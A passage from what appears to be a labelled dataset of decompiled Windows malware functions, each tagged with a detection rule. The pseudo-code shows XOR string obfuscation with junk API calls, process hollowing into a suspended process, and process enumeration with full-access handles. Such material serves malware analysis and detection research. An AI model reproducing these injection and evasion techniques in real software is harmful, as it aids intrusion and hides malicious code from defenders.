0x2e);\n    uStack972 = 0x104;\n    uStack984 = 0x403cc3;\n    iStack980 = iVar12;\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)();\n    pcVar4 = _sym.imp.KERNEL32.dll_lstrcatW;\n    uStack984 = uStack960;\n    (*_sym.imp.KERNEL32.dll_lstrcatW)();\n    (*pcVar4)(unaff_ESI, 0x4114e4);\n    puVar13 = unaff_ESI;\n    (*pcVar4)(unaff_ESI, arg_8h);\n    (*pcVar4)(unaff_ESI, 0x4114ec);\n    pcVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n    while (iVar16 = (*pcVar4)(0, unaff_ESI, 0, 0, 0, 0x800000c, 0, 0, &stack0xfffffc9c, &stack0xfffffc80),  iVar16 == 0)\n    {\n        (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n    }\n    puVar18 = NULL;\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uStack804 = 0x10002;\n    puVar13 = puVar13 + *(puVar13 + 0x3c);\n    puStack988 = puVar13;\n    iVar16 = (*_sym.imp.KERNEL32.dll_GetThreadContext)(CONCAT13(uStack897, uStack901._1_3_), &stack0xfffffcdc);\n    if (iVar16 != 0) {\n        iVar16 = *(puVar13 + 0x50);\n        iVar5 = fcn.00401b9b(&stack0xfffffc24);\n        if ((iVar5 == 0) && (iVar5 = fcn.004018f7(&stack0xfffffc5c),  iVar5 == 0)) {\n            puVar15 = puVar18;\n            if (puVar18 != NULL) {\n                for (; iVar16 != 0; iVar16 = iVar16 + -1) {\n                    *puVar15 = 0;\n                    puVar15 = puVar15 + 1;\n                }\n                puVar15 = unaff_ESI;\n                puVar17 = puVar18;\n                for (iVar12 = *(puVar13 + 0x54); iVar12 != 0; iVar12 = iVar12 + -1) {\n                    *puVar17 = *puVar15;\n                    puVar15 = puVar15 + 1;\n                    puVar17 = puVar17 + 1;\n                }\n                uVar19 = 0;\n                if (*(puVar13 + 6) != 0) {\n                    piVar7 = puVar13 + *(puVar13 + 0x14) + 0x24;\n                    do {\n                        iVar12 = piVar7[1];\n                        if (iVar12 != 0) {\n                            puVar15 = unaff_ESI + *piVar7;\n                            puVar17 = puVar18 + *piVar7;\n                            for (; iVar12 != 0; iVar12 = iVar12 + -1) {\n                                *puVar17 = *puVar15;\n                                puVar15 = puVar15 + 1;\n                                puVar17 = puVar17 + 1;\n                            }\n                        }\n                        piVar7 = piVar7 + 10;\n                        uVar19 = uVar19 + 1;\n                    } while (uVar19 < *(puVar13 + 6));\n                }\n                iVar12 = 0xa0;\n                if (*(puVar13 + 4) == -0x799c) {\n                    iVar12 = 0xb0;\n                }\n                iVar16 = *(puVar13 + 0x34);\n                uVar19 = uStack932 - *(puVar13 + 0x34);\n                uVar10 = (uStack932 >> 0x1f) - (uStack932 < *(puVar13 + 0x34));\n                uStack897 = uStack897 & 0xff | uVar19 * 0x100;\n                uStack893._1_3_ = uVar10;\n                uStack893 = CONCAT31(uStack893._1_3_, uVar19 >> 0x18);\n                uStack889 = uStack889 & 0xffffff00 | uVar10 >> 0x18;\n                piVar7 = unaff_ESI + *(puVar13 + iVar12);\n                if ((*(puVar13 + iVar12) != 0) && (uStack984 = *(puVar13 + iVar12 + 4),  uStack984 != 0)) {\n                    for (; 8 < uStack984; uStack984 = uStack984 - *piVar14) {\n                        uVar11 = piVar7[1] - 8U >> 1;\n                        iVar12 = *piVar7;\n                        if ((piVar7[1] <= uStack984) && (uVar11 != 0)) {\n                            piVar14 = piVar7 + 2;\n                            do {\n                                uVar2 = *piVar14;\n                                if (uVar2 >> 0xc == 3) {\n                                    *(puVar18 + (uVar2 & 0xfff) + iVar12) =\n                                         *(puVar18 + (uVar2 & 0xfff) + iVar12) + (uStack932 - iVar16);\n                                }\n                                else if (uVar2 >> 0xc == 10) {\n                                    uVar8 = uVar2 & 0xfff;\n                                    puVar1 = puVar18 + uVar8 + iVar12;\n                                    uVar3 = *puVar1;\n                                    *puVar1 = *puVar1 + uVar19;\n                                    *(puVar18 + uVar8 + 4 + iVar12) =\n                                         *(puVar18 + uVar8 + 4 + iVar12) + uVar10 + CARRY4(uVar3, uVar19);\n                                }\n                                piVar14 = piVar14 + 2;\n                                uVar11 = uVar11 - 1;\n                            } while (uVar11 != 0);\n                        }\n                        piVar14 = piVar7 + 1;\n                        piVar7 = piVar7 + piVar7[1];\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0);\n                iVar16 = (*_sym.imp.KERNEL32.dll_ReadProcessMemory)(iStack916, iStack652 + 8, &stack0xfffffc84, 4, 0);\n                iVar12 = uStack920;\n                if (iVar16 != 0) {\n                    fcn.00403b31(uStack636);\n                    fcn.00403af0(&stack0xfffffc60);\n                    (*_sym.imp.KERNEL32.dll_ResumeThread)(iStack916);\n                    iStack916 = 1;\n                    iVar12 = uStack920;\n                }\n                goto code_r0x00403f90;\n            }\n        }\n        else {\ncode_r0x00403f90:\n            if (puVar18 != NULL) {\n                fcn.00401a5e();\n            }\n        }\n        if (puStack988 != NULL) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(puStack988);\n        }\n        if (iStack916 != 0) goto code_r0x00403fd3;\n    }\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uStack912, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack920);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uStack920);\ncode_r0x00403fd3:\n    uVar6 = uStack912;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar12);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    return uVar6;\n}\n",
        "token_count": 3025
    },
    "00405076": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00405076(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    int32_t *lpLibFileName;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t dwSize;\n    \n    var_8h = 0xffffffff;\n    iVar10 = 0;\n    var_18h = 5;\n    var_24h = param_1;\n    var_20h = param_2;\n    if (*0x41db0c == NULL) {\n        var_38h = 0xf0e380d;\n        var_34h = 0x20071c21;\n        var_14h = 6;\n        var_30h._0_1_ = 6;\n        var_30h._1_1_ = 99;\n        var_2ch = 0x636a4c63;\n        var_28h._0_2_ = 0x324d;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar5 != 0x2501ed) {\n                *(iVar10 + iVar4) = *(&var_2ch + iVar10 % var_14h) ^ (iVar10 + iVar4)[&var_38h - iVar4];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_54h = 0x4338227c;\n        var_50h = 0x3a2f4033;\n        var_4ch = 0x3346254f;\n        var_48h = 0x54387f04;\n        var_44h = 0x375b1b39;\n        var_40h._0_2_ = 0x3f46;\n        var_40h._2_1_ = 6;\n        stack0xffffffbf = 0x5658;\n        var_10h = 0x36695632;\n        var_ch._0_1_ = 0x56;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar4 = 0;\n        var_14h = &var_54h - iVar10;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0x25a3cb) {\n                *(iVar4 + iVar10) = *(&var_10h + iVar4 % var_18h) ^ (iVar4 + iVar10)[&var_54h - iVar10];\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar10);\n        *0x41db0c = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    dwSize = 0;\n    iVar10 = (**0x41db0c)(5, 0, 0, &dwSize);\n    if (iVar10 == -0x3ffffffc) {\n        dwSize = dwSize + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar10 = (**0x41db0c)(5, piVar7, dwSize, 0);\n            uVar3 = var_20h;\n            if (-1 < iVar10) {\n                var_8h = 0;\n                piVar11 = piVar7;\n                do {\n                    iVar10 = piVar11[0x11];\n                    if (((iVar10 != 0) && (iVar10 != 4)) && (iVar10 != *0x41dad0)) {\n                        uVar8 = fcn.004098f6();\n                        uVar9 = fcn.004048d3();\n                        iVar10 = (*var_24h)(piVar11[0xf], uVar9, piVar11[0x11], piVar11[0x12], uVar8, uVar3);\n                        piVar7 = lpLibFileName;\n                        if (iVar10 == 0) break;\n                    }\n                    piVar7 = lpLibFileName;\n                    if (*piVar11 == 0) break;\n                    piVar11 = piVar11 + *piVar11;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar7, 0, 0x8000);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1412
    },
    "0040533b": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040533b(int32_t *param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t *hHeap;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    iVar6 = -0x3fffffdd;\n    if ((((param_1 != NULL) && (param_2 != NULL)) && (*param_1 != 0)) && (hHeap = param_1[1],  hHeap != NULL)) {\n        if (*param_1 == *hHeap) {\n            var_38h = 0x1c082420;\n            var_34h = 0x93f1120;\n            var_30h = 0x23173728;\n            var_2ch = 0x14301a17;\n            var_28h = 0x452a0136;\n            var_24h = 0x58645072;\n            var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x45);\n            var_1ch = param_2;\n            var_18h = param_1;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar7 = 0;\n            var_10h = &var_38h - iVar6;\n            var_14h = iVar6;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                if (iVar4 != 0xfce04e) {\n                    var_8h = 5;\n                    *(iVar7 + iVar6) = *(&var_24h + iVar7 % 5) ^ (iVar7 + iVar6)[var_10h];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x14);\n            var_30h = 0xf0e380d;\n            var_2ch = 0x20071c21;\n            var_10h = 6;\n            var_28h = var_28h & 0xffff0000 | 0x6306;\n            var_24h = 0x636a4c63;\n            var_20h._0_2_ = 0x324d;\n            uVar3 = (*pcVar1)(8, 0xb);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            var_8h = &var_30h - iVar7;\n            do {\n                iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                iVar4 = var_14h;\n                if (iVar5 != 0x2501ed) {\n                    *(iVar6 + iVar7) = *(&var_24h + iVar6 % var_10h) ^ (iVar6 + iVar7)[var_8h];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 10);\n            uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar7, var_14h);\n            var_14h = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n            uVar3 = (*pcVar1)(8, hHeap[1]);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = *hHeap;\n            var_18h = var_18h[1] + 0xc;\n            fcn.004052a9();\n            piVar2 = hHeap;\n            iVar6 = (*var_14h)(2, var_8h, hHeap[1], var_18h, iVar6 + -0xc, &var_ch);\n            hHeap = iVar6;\n            if (iVar6 == 0) {\n                if (var_ch == piVar2[1]) {\n                    var_1ch[1] = var_8h;\n                    *var_1ch = var_ch;\n                }\n                else {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                    iVar6 = -0x3fffff85;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*pcVar1)(uVar3);\n        }\n        else {\n            iVar6 = -0x3fffff85;\n        }\n    }\n    return iVar6;\n}\n",
        "token_count": 1250
    },
    "004063bc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004063bc(void)\n\n{\n    int16_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    code *var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t lpModuleName;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_3ch._0_1_ = 0x3a;\n    var_3ch._1_1_ = 0x51;\n    var_3ch._2_2_ = 0x2a18;\n    var_38h._0_2_ = 0x3d54;\n    var_38h._2_1_ = 7;\n    var_38h._3_1_ = 0x58;\n    var_34h._0_2_ = 0x556a;\n    var_34h._2_1_ = 0x3d;\n    var_34h._3_1_ = 0x58;\n    var_30h._0_1_ = 0x6a;\n    var_24h = 0x446a3451;\n    var_20h._0_1_ = 0x31;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_4h = 5;\n    iVar8 = 0;\n    lpModuleName = iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        if (iVar4 != 0x3644e2) {\n            *(iVar8 + iVar3) = *(&var_24h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_3ch - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xd);\n    var_38h._0_2_ = 0xb0d;\n    var_38h._2_1_ = 2;\n    var_18h = 1;\n    var_38h._3_1_ = 1;\n    var_34h._0_2_ = 0x3f11;\n    var_34h._2_1_ = 0xd;\n    var_34h._3_1_ = 1;\n    var_30h._0_1_ = 0x24;\n    var_30h._1_1_ = 0x50;\n    var_24h = 0x656c624b;\n    var_20h._0_1_ = 0x50;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar8 = 0;\n    var_14h = iVar3;\n    var_10h = &var_38h - iVar3;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar4 != 0xa61c71) {\n            *(iVar8 + iVar3) = *(&var_24h + iVar8 % var_4h) ^ (iVar8 + iVar3)[&var_38h - iVar3];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 10);\n    var_3ch._0_1_ = 0x2b;\n    var_3ch._1_1_ = 5;\n    var_3ch._2_2_ = 0x152c;\n    var_38h._0_2_ = 0x3b54;\n    var_38h._2_1_ = 0x2a;\n    var_38h._3_1_ = 0;\n    var_34h._0_2_ = 0x132d;\n    var_34h._2_1_ = 0x74;\n    var_34h._3_1_ = 0x23;\n    var_30h._0_1_ = 3;\n    var_30h._1_1_ = 4;\n    var_30h._2_2_ = 0x7702;\n    var_2ch = 0x7743696c;\n    var_28h._0_2_ = 0x5735;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar3 = lpModuleName;\n    iVar4 = 0;\n    var_1ch = &var_3ch - iVar8;\n    var_24h = iVar8;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar5 != 0xa17a34) {\n            var_10h = 6;\n            *(iVar4 + iVar8) = *(&var_2ch + iVar4 % 6) ^ (iVar4 + iVar8)[var_1ch];\n        }\n        pcVar6 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, iVar8);\n    var_1ch = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    uVar2 = (*pcVar6)(iVar3, var_14h);\n    pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    iVar1 = (*pcVar6)(var_8h);\n    pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar1 == 0) {\n        iVar1 = (*var_1ch)(var_8h);\n        if (iVar1 == 0) {\n            var_3ch._0_1_ = 1;\n            var_3ch._1_1_ = 0x38;\n            var_3ch._2_2_ = 0x272a;\n            var_38h._0_2_ = 0x2a50;\n            var_38h._2_1_ = 0x15;\n            var_38h._3_1_ = 0x21;\n            var_34h._0_2_ = 0x7021;\n            var_34h._2_1_ = 0x32;\n            var_34h._3_1_ = 0x3b;\n            var_30h._0_1_ = 0x28;\n            var_30h._1_1_ = 4;\n            var_30h._2_2_ = CONCAT11(var_30h._3_1_, 0x31);\n            var_2ch = 0x45455446;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x31);\n            uVar2 = (*pcVar6)(8, 0x10);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_1ch = &var_3ch - iVar3;\n            var_10h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n                if (iVar4 != 0x923c02) {\n                    *(iVar8 + iVar3) = *(&var_2ch + iVar8 % var_4h) ^ (iVar8 + iVar3)[var_1ch];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0xf);\n            var_38h._0_2_ = 0x5677;\n            var_38h._2_1_ = 0x12;\n            var_38h._3_1_ = 0x13;\n            var_34h._0_2_ = 0x5944;\n            var_34h._2_1_ = 0x5f;\n            var_34h._3_1_ = 0x37;\n            var_30h._0_1_ = 0x52;\n            var_2ch = 0x52763236;\n            var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x30);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n            iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar4 = 0;\n            var_1ch = &var_38h - iVar8;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                iVar3 = lpModuleName;\n                if (iVar5 != 0xfa6a89) {\n                    *(iVar4 + iVar8) = *(&var_2ch + iVar4 % var_4h) ^ (&var_38h - iVar8)[iVar4 + iVar8];\n                }\n                iVar4 = iVar4 + 1;\n            } while (iVar4 < 9);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar8);\n            pcVar6 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_10h);\n            pcVar7 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n            (*pcVar7)(var_8h);\n            (*pcVar6)(var_8h);\n            pcVar6 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n            pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar6)(0, var_10h);\n            (*pcVar7)(uVar2);\n            iVar8 = var_24h;\n            goto code_r0x004066a4;\n        }\n    }\n    var_18h = 0;\ncode_r0x004066a4:\n    uVar2 = (*pcVar6)(0, iVar8);\n    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar6)(0, var_14h);\n    (*pcVar7)(uVar2);\n    uVar2 = (*pcVar6)(0, iVar3);\n    (*pcVar7)(uVar2);\n    return var_18h;\n}\n",
        "token_count": 2533
    },
    "00409ce4": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409ce4(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = 0xf0e380d;\n    var_20h = 0x20071c21;\n    var_4h = 6;\n    var_1ch._0_2_ = 0x6306;\n    var_18h = 0x636a4c63;\n    var_14h._0_2_ = 0x324d;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar3 != 0x2501ed) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x978056d;\n    var_24h = 0x672307;\n    var_20h = 0x3e071a58;\n    var_1ch._0_2_ = 0x7244;\n    var_18h = 0x79377237;\n    var_14h._0_2_ = 0x4d62;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0xfb6cb0) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 841
    },
    "00409e62": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00409e62(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ah;\n    uchar var_36h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_28h = 0;\n    var_8h = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_8h = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.00409e19();\n    }\n    if (*0x41dd28 == NULL) {\n        var_34h = 0xf0e380d;\n        var_30h = 0x20071c21;\n        var_ch = 6;\n        var_2ch._0_1_ = 6;\n        var_2ch._1_1_ = 99;\n        var_20h = 0x636a4c63;\n        var_1ch._0_2_ = 0x324d;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_10h = &var_34h - iVar3;\n        lpModuleName = iVar3;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar4 != 0x2501ed) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_ch) ^ (iVar6 + iVar3)[var_10h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_50h = 0x13d2309;\n        var_4ch = 0x3860652e;\n        var_48h = 0x237380b;\n        var_44h = 0x262d1c03;\n        var_40h._0_1_ = 0x35;\n        var_40h._1_1_ = 6;\n        stack0xffffffbe = 0x3b3e3c23;\n        var_3ah = 0x676f1718;\n        var_36h = 0x54;\n        var_20h = 0x6e6a5453;\n        var_1ch._0_2_ = CONCAT11(var_1ch._1_1_, 0x59);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_ch = &var_50h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            iVar4 = lpModuleName;\n            if (iVar5 != 0x6d1416) {\n                var_10h = 5;\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % 5) ^ (iVar6 + iVar3)[var_ch];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41dd28 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_18h;\n        if (*0x41dd28 == NULL) goto code_r0x0040a00a;\n    }\n    iVar3 = var_4h;\n    iVar6 = (**0x41dd28)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar6) {\n    }\ncode_r0x0040a00a:\n    if (var_8h != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_28h;\n}\n",
        "token_count": 1234
    },
    "0040a020": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
